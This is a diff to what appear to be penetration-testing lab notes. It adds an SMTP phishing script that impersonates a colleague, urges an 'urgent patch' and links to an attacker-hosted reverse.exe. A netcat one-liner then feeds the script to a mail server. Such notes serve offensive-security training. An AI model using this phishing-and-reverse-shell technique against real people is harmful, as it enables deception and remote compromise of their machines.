@@ -152,5 +152,23 @@ generate shellcode, filtering out bad characters
 
 ### smtp > netcat
 
+smtp file contents:
+```
+HELO VICTIM
+MAIL FROM: <rmurray@victim>
+RCPT TO: <tharper@victim>
+DATA
+Subject: This is an urgent patch please install!
+
+Please install this urgent patch
+
+http://192.168.119.243:9002/reverse.exe
+
+Sincerly, Ross
+
+.
+QUIT
+```
+
 `cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`
 
